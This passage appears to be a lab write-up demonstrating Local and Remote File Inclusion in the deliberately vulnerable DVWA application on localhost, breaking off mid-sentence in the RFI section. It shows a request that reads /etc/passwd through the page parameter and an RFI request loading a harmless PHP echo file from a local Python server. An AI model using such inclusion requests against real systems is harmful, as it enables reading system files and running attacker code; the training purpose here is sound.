# File Inclusion

## Objective

To demonstrate Local File Inclusion (LFI) and Remote File Inclusion (RFI) vulnerabilities in the DVWA File Inclusion module.

## Lab Environment

* Application: Damn Vulnerable Web Application (DVWA)
* Security Level: Low
* Web Server: Apache
* Operating System: Kali Linux

## 1. Local File Inclusion (LFI)

The DVWA File Inclusion functionality was tested by manipulating the `page` parameter to reference a local file.

The following file was requested:

```text id="y7b4qm"
http://127.0.0.1/dvwa/vulnerabilities/fi/?page=/etc/passwd
```

The application successfully displayed the contents of the local `/etc/passwd` file.

This demonstrated that user-controlled input was being used to determine which file the application included.

### Impact

LFI can allow an attacker to:

* Read sensitive local files.
* Disclose system and application configuration information.
* Identify users and system accounts.
* Potentially escalate the attack when combined with other vulnerabilities.

## 2. Remote File Inclusion (RFI)

The Apache PHP configuration was verified to support remote file inclusion for the controlled laboratory demonstration.

A harmless PHP test file was created:

```php id="5a5c3m"
<?php
echo "RFI Test Successful";
?>
```

A local Python HTTP server was started to host the test file:

```bash id="9d5z3r"
cd /var/www/html
python3 -m http.server 8000
```

The DVWA File Inclusion module was then supplied with the URL of the controlled test file:

```text id="1n1i6g"
http://127.0.0.1/dvwa/vulnerabilities/fi/?page=http://127.0.0.1:8000/rfi_test.php
```

The application executed the con
